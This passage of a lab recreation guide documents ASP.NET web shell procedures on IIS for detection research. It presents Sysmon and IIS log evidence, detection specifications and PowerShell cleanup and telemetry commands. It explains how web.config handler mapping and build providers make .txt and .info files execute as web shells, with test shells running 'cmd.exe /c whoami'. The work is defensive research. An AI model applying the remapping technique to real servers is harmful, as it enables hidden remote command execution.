|---|---|---|---|
| Sysmon 1 (Process Create) | cmd.exe from C1 whoami | ✅ **Confirmed** | `"cmd.exe" /c whoami`, ParentImage = w3wp.exe |
| Sysmon 1 (csc.exe) | Compilation of unusual extensions | ✅ **Confirmed** | Separate csc.exe spawn per variant |
| Sysmon 11 (File Create) | Compilation artifacts | ✅ **Confirmed** | `readme.txt.*.compiled` and `status.info.*.compiled` |
| Win 4688 | Process creation with cmdline | ✅ **Confirmed** | cmd.exe + both csc.exe compilations captured |
| IIS W3C | Requests to unusual extensions | ✅ **Confirmed** | `.txt` and `.info` returning 200 |

#### Key Sysmon Event ID 1 Evidence (C1 — cmd.exe /c whoami through .txt file)

```
Image:              C:\Windows\System32\cmd.exe
CommandLine:        "cmd.exe" /c whoami
User:               IIS APPPOOL\DefaultAppPool
IntegrityLevel:     High
ParentImage:        C:\Windows\System32\inetsrv\w3wp.exe
```

Identical parent-child relationship as Procedure A — the detection for w3wp.exe → cmd.exe works regardless of the file extension used.

#### Key Sysmon Event ID 11 Evidence — Compilation Artifacts Preserve Original Extension

| Variant | Compilation Artifact Path |
|---------|--------------------------|
| C1 (.txt) | `Temporary ASP.NET Files\test_shells_proc_c1\...\readme.txt.cdcab7d2.compiled` |
| C2 (.info) | `Temporary ASP.NET Files\test_shells_proc_c2\...\status.info.cdcab7d2.compiled` |

**Detection gold mine:** ASP.NET compilation of `.txt` or `.info` files is highly anomalous. A detection alerting on `.compiled` files where the source extension is NOT `.aspx`, `.ashx`, `.asmx`, or `.cshtml` would be very high fidelity.

Additional compilation artifacts per variant:
- `App_Web_*.dll` — compiled assembly
- `App_Web_*.0.cs`, `App_Web_*.1.cs` — generated C# source
- `*.cmdline`, `*.out`, `*.err` — compiler I/O
- `preStartInitList.web`, `hash\hash.web` — application initialization metadata

#### Key IIS W3C Log Evidence

```
18:52:44 /test_shells/proc_c1/readme.txt  -          500  ← Before fix (buildProvider error)
18:52:44 /test_shells/proc_c1/readme.txt  cmd=whoami  500  ← Before fix
18:52:44 /test_shells/proc_c2/status.info -           500  ← Before fix (config scope error)
18:56:35 /test_shells/proc_c1/readme.txt  -           200  ← After fix — SUCCESS
18:56:35 /test_shells/proc_c1/readme.txt  cmd=whoami  200  ← Command execution through .txt!
18:56:37 /test_shells/proc_c2/status.info -           200  ← After fix — SUCCESS
```

The 500→200 transition is visible in IIS logs and would be a forensic indicator of an attacker iterating on their web.config configuration.

#### Procedure C Prerequisites — TRR Refinement

Lab testing revealed that Procedure C's Write Config operation is more complex than originally documented. The web.config manipulation requires **two** configuration elements, not one:

1. **Handler mapping** (`<system.webServer><handlers>`) — routes the non-standard extension to the ASP.NET `PageHandlerFactory`
2. **Build provider** (`<system.web><compilation><buildProviders>`) — registers `System.Web.Compilation.PageBuildProvider` for the extension so ASP.NET knows how to compile it

Additionally, the build provider has a **scope constraint**: `<buildProviders>` can only be defined at the IIS Application level, not in an arbitrary subdirectory. This means Procedure C requires one of:

- The target directory is already configured as an IIS Application (most common in real deployments)
- The attacker can modify the site root's `web.config` (broader impact, more likely to be detected)
- The attacker can modify `machine.config` (requires SYSTEM access, highly unlikely)

This constraint narrows the attack surface and should be documented in the TRR's Technical Background section.

#### Procedure C Detection Recommendations (Refined from Lab Results)

| Priority | Detection | Telemetry | Fidelity | Notes |
|----------|-----------|-----------|----------|-------|
| 1 | `.compiled` files for non-standard extensions | Sysmon 11 | **Very High** | `.txt.compiled`, `.info.compiled` etc. are never legitimate |
| 2 | New web.config files in web directories | Sysmon 11 | **High** | Rare in production, should be change-controlled |
| 3 | w3wp.exe spawns cmd.exe (same as Proc A) | Sysmon 1 / Win 4688 | **High** | Extension-agnostic — catches C1 variant |
| 4 | New Temporary ASP.NET Files subdirectories | Sysmon 11 | **Medium-High** | New app compilation paths indicate new applications |
| 5 | IIS requests returning 200 for unusual file extensions | IIS W3C | **Medium** | Need baseline of expected extensions |

### Step 5.5 — Application Initialization Variant (Not Tested)

The Application Initialization variant (auto-trigger via app pool recycle) was not tested in this lab iteration. The core Procedure C operations (Write Config → handler remapping → code execution) are fully validated. Testing the Application Initialization persistence enhancement would require configuring `<applicationInitialization>` in `web.config` with a preload page pointing to the web shell, then recycling the app pool and verifying the shell executes without an external HTTP request. This remains a future exercise.

---

## Phase 6: Detection Specifications

This phase documents detection specifications derived from lab-validated telemetry. These are not implemented detection rules — they are specifications that describe what to detect, which telemetry to use, and what fidelity to expect. Implementation in a specific SIEM or EDR platform (as KQL, Sigma, SPL, etc.) is left as a separate exercise, as query syntax and tuning are environment-specific.

### Detection Strategy Summary

Lab testing validated the DDM and revealed a clear detection hierarchy. The table below consolidates findings across all three procedures, ordered by detection fidelity:

| # | Detection | Telemetry | Fidelity | Procedure Coverage |
|---|-----------|-----------|----------|--------------------|
| 1 | w3wp.exe spawns cmd.exe/powershell.exe | Sysmon 1 / Win 4688 | **Very High** | A, C (when shell spawns process) |
| 2 | `.compiled` files for non-standard extensions (.txt, .info, etc.) | Sysmon 11 | **Very High** | C |
| 3 | w3wp.exe spawns csc.exe (dynamic compilation) | Sysmon 1 / Win 4688 | **High** | A, B, C (first access only) |
| 4 | New web.config in web-accessible directories | Sysmon 11 | **High** | C |
| 5 | New .aspx/.asp/.ashx files in web root | Sysmon 11 | **Medium** | A, B |
| 6 | New Temporary ASP.NET Files subdirectories | Sysmon 11 | **Medium-High** | C |
| 7 | BAM registry entries for cmd.exe under IIS SID | Sysmon 13 | **Medium** | A, C |
| 8 | IIS log anomalies (unusual extensions, parameters) | IIS W3C | **Low-Medium** | All |
| 9 | (BLIND SPOT) In-process .NET API execution | None practical | **N/A** | B |

### Key Findings

**Convergence point:** Detection #1 (w3wp.exe → cmd.exe) covers both Procedure A and Procedure C when the shell spawns a process. This is the highest-fidelity single detection point.

**Procedure B remains a blind spot:** No practical process-based detection exists for in-process .NET API web shells. The only telemetry is file creation (Sysmon 11, at deploy time only) and IIS request logs (with severe classification difficulty). The SACL approach was tested and found insufficient — Procedure B only performs read operations, and auditing ReadData would generate unacceptable noise in production.

**Procedure C has unique detection opportunities:** The compilation artifact filenames preserve the original source extension (e.g., `readme.txt.compiled`), making non-standard extension compilation a very high-fidelity detection — there is no legitimate reason for ASP.NET to compile `.txt` or `.info` files.

### Specification 1 — w3wp.exe Child Process (Procedures A, C)

**Target telemetry:** Sysmon Event ID 1, Windows Event 4688  
**Logic:** Alert when `w3wp.exe` spawns `cmd.exe`, `powershell.exe`, `csc.exe`, or other command interpreters/system utilities  
**Expected fidelity:** Very High — this parent-child relationship is rarely legitimate in production  
**Lab evidence:** Confirmed in Procedure A (`cmd.exe /c whoami`, `cmd.exe /c ipconfig`) and Procedure C1 (`cmd.exe /c whoami` through `.txt` handler remapping)

### Specification 2 — Non-Standard Extension Compilation (Procedure C)

**Target telemetry:** Sysmon Event ID 11  
**Logic:** Alert on files matching `Temporary ASP.NET Files\*\*.compiled` where the source filename extension is NOT `.aspx`, `.ashx`, `.asmx`, `.cshtml`, `.vbhtml`  
**Expected fidelity:** Very High — there is no legitimate reason for ASP.NET to compile `.txt`, `.info`, `.jpg`, etc.  
**Lab evidence:** Confirmed with `readme.txt.cdcab7d2.compiled` and `status.info.cdcab7d2.compiled`

### Specification 3 — Web Shell File Creation (Procedures A, B)

**Target telemetry:** Sysmon Event ID 11  
**Logic:** Alert on new `.aspx`, `.asp`, `.ashx`, `.asmx` files created in IIS web root directories  
**Expected fidelity:** Medium — legitimate deployments create these files too  
**Tuning note:** Whitelist known deployment paths/processes; investigate files created by unexpected processes

### Specification 4 — web.config Modification (Procedure C)

**Target telemetry:** Sysmon Event ID 11, FIM  
**Logic:** Alert on creation or modification of `web.config` files in web-accessible directories  
**Expected fidelity:** High — web.config changes in production should be rare and controlled  
**Lab evidence:** web.config creation captured by SACL (4663) at deploy time

### Specification 5 — IIS Log Analysis (All Procedures)

**Target telemetry:** IIS W3C logs  
**Logic:** Identify anomalous requests — unusual extensions returning 200, requests with suspicious parameters (`cmd=`, `action=listdir`), unusual User-Agents, first-seen URIs with high response times (compilation indicator)  
**Expected fidelity:** Low-Medium — high classification difficulty, best used as enrichment rather than primary detection

---

## Appendix A: Cleanup Procedures

After testing is complete, reverse all changes:

```powershell
# Remove IIS Applications created for Procedure C
Import-Module WebAdministration
Remove-WebApplication -Name "test_shells/proc_c1" -Site "Default Web Site"
Remove-WebApplication -Name "test_shells/proc_c2" -Site "Default Web Site"

# Remove test web shells
Remove-Item "C:\inetpub\wwwroot\test_shells" -Recurse -Force

# Uninstall Sysmon
C:\Tools\Sysmon\Sysmon64.exe -u

# Revert audit policy
auditpol /set /subcategory:"Process Creation" /success:disable /failure:disable
auditpol /set /subcategory:"File System" /success:disable /failure:disable

# Remove command-line logging
reg delete "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\Audit" /v ProcessCreationIncludeCmdLine_Enabled /f

# Remove SACL from web root
$acl = Get-Acl "C:\inetpub\wwwroot"
$acl.SetSecurityDescriptorSddlForm($acl.Sddl)
# Or use the system restore point for full rollback

# Optionally uninstall IIS entirely
# Disable-WindowsOptionalFeature -Online -FeatureName IIS-WebServerRole

# Or use the system restore point created at the start
```

## Appendix B: File Locations

| Item | Path |
|------|------|
| IIS Web Root | `C:\inetpub\wwwroot` |
| IIS Logs | `C:\inetpub\logs\LogFiles\W3SVC1` |
| Sysmon Installation | `C:\Tools\Sysmon` |
| Sysmon Config | `C:\Tools\Sysmon\trr0000_sysmon_config.xml` |
| ASP.NET Temp Files | `C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Temporary ASP.NET Files` |
| Test Shell Directory | `C:\inetpub\wwwroot\test_shells` |
| Log Captures | `C:\Tools\TRR0000_logs` |
| Sysmon Logs | Event Viewer → Applications and Services Logs → Microsoft → Windows → Sysmon → Operational |
| Security Logs | Event Viewer → Windows Logs → Security |

## Appendix C: Useful Commands

### Telemetry Capture Template (Per-Procedure)

After executing a procedure, run this block to capture all relevant telemetry to files for review. Replace `proc_X` with the procedure identifier (e.g., `proc_a`, `proc_b`).

```powershell
$proc = "proc_b"  # Change per procedure

# Sysmon - all events since last clear
Get-WinEvent -LogName "Microsoft-Windows-Sysmon/Operational" -ErrorAction SilentlyContinue |
    Format-List Id, TimeCreated, Message |
    Out-File "C:\Tools\TRR0000_logs\${proc}_sysmon.txt" -Width 300

# 4688 - process creation filtered to w3wp.exe as parent
Get-WinEvent -LogName "Security" -FilterXPath "*[System[EventID=4688] and EventData[Data[@Name='ParentProcessName']='C:\Windows\System32\inetsrv\w3wp.exe']]" -MaxEvents 20 -ErrorAction SilentlyContinue |
    Format-List TimeCreated, Message |
    Out-File "C:\Tools\TRR0000_logs\${proc}_4688.txt" -Width 300

# 4663 - object access (SACL) - recent events
Get-WinEvent -LogName "Security" -FilterXPath "*[System[EventID=4663]]" -MaxEvents 30 -ErrorAction SilentlyContinue |
    Format-List TimeCreated, Message |
    Out-File "C:\Tools\TRR0000_logs\${proc}_4663.txt" -Width 300

# IIS logs
$iisLog = Get-ChildItem "C:\inetpub\logs\LogFiles\W3SVC1" | Sort-Object LastWriteTime -Descending | Select-Object -First 1
Copy-Item $iisLog.FullName "C:\Tools\TRR0000_logs\${proc}_iis.log"

Get-ChildItem "C:\Tools\TRR0000_logs\${proc}*" | Format-Table Name, Length
```

**Note:** Unfiltered 4688 captures are dominated by Docker and system noise. Always use the XPath filter for `ParentProcessName` = `w3wp.exe` to isolate relevant events.

### General Commands

```powershell
# View recent Sysmon events
Get-WinEvent -LogName "Microsoft-Windows-Sysmon/Operational" -MaxEvents 20 | Format-List

# View Sysmon events filtered by Event ID (e.g., Process Create = 1)
Get-WinEvent -LogName "Microsoft-Windows-Sysmon/Operational" -FilterXPath "*[System[EventID=1]]" -MaxEvents 10

# View recent Security events (Process Creation = 4688)
Get-WinEvent -LogName "Security" -FilterXPath "*[System[EventID=4688]]" -MaxEvents 10

# View IIS logs
Get-Content "C:\inetpub\logs\LogFiles\W3SVC1\*" -Tail 20

# List IIS worker processes
Get-Process w3wp -ErrorAction SilentlyContinue

# Recycle the default app pool (useful for Procedure C testing)
Restart-WebAppPool -Name "DefaultAppPool"

# Check Sysmon config
C:\Tools\Sysmon\Sysmon64.exe -c

# Update Sysmon config without reinstalling
C:\Tools\Sysmon\Sysmon64.exe -c C:\Tools\Sysmon\trr0000_sysmon_config.xml

# Check current audit policy
auditpol /get /category:*

# Export Sysmon log to XML for offline analysis
wevtutil epl "Microsoft-Windows-Sysmon/Operational" C:\Tools\Sysmon\sysmon_export.evtx

# Export Security log events for a time range
Get-WinEvent -LogName "Security" -FilterXPath "*[System[TimeCreated[@SystemTime>='YYYY-MM-DDTHH:MM:SS']]]" | Export-Csv C:\Tools\security_events.csv -NoTypeInformation
```

---

*TRR0000 Lab Recreation Guide — Procedures A, B, and C executed and validated. Detection specifications documented. Application Initialization variant and SIEM rule implementation remain as future exercises.*
